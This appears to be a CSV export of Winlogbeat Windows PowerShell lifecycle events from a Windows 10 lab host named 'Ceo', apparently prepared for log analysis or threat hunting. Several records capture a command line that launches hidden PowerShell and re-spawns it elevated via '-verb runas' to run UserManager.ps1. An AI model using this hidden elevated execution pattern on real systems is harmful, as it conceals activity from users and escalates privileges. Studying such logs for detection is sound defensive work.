"Oct 23, 2022 @ 17:10:17.842",fHkbBIQByII7dpeEczNY,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:10:18.856","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=22

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=01ead362-b73a-4796-9ebf-ef5eb707cb91
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=22

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=01ead362-b73a-4796-9ebf-ef5eb707cb91
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4617,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:17.827",e3kbBIQByII7dpeEczNY,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:10:18.856","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=a9d1f12e-7368-47ee-be21-af0e08d0d9f9
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=a9d1f12e-7368-47ee-be21-af0e08d0d9f9
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4616,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:17.562",Z3kbBIQByII7dpeEbzMD,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:10:17.747","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=a9d1f12e-7368-47ee-be21-af0e08d0d9f9
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=a9d1f12e-7368-47ee-be21-af0e08d0d9f9
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4615,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:17.547",YXkbBIQByII7dpeEbzMD,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:17.747","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4609,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:17.547",YnkbBIQByII7dpeEbzMD,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:17.747","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4610,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:17.547",Y3kbBIQByII7dpeEbzMD,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:17.747","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4611,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:17.547",ZHkbBIQByII7dpeEbzMD,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:17.747","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4612,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:17.547",ZXkbBIQByII7dpeEbzMD,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:17.747","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4613,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:17.547",ZnkbBIQByII7dpeEbzMD,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:17.747","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=a080d859-22b9-4a92-8d8f-39f2ec2bb44a
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4614,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:15.621",WnkbBIQByII7dpeEZjPH,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:15.641","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Certificate"" is Started. 

Details: 
	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=01ead362-b73a-4796-9ebf-ef5eb707cb91
	PipelineId=7
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Certificate,"-","-","-","-",Started,"-","-","-","	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=01ead362-b73a-4796-9ebf-ef5eb707cb91
	PipelineId=7
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4608,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:15.264",WXkbBIQByII7dpeEZjPH,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:10:15.641","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=01ead362-b73a-4796-9ebf-ef5eb707cb91
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=01ead362-b73a-4796-9ebf-ef5eb707cb91
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4607,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:15.201",U3kbBIQByII7dpeEZjPH,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:15.640","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4601,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:15.201",VHkbBIQByII7dpeEZjPH,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:15.640","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=dbf0d8c5-0d39-4ba9-8fb9-b18ff530f70d
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4602,"Provider Lifecycle","-","-","-","-","-"
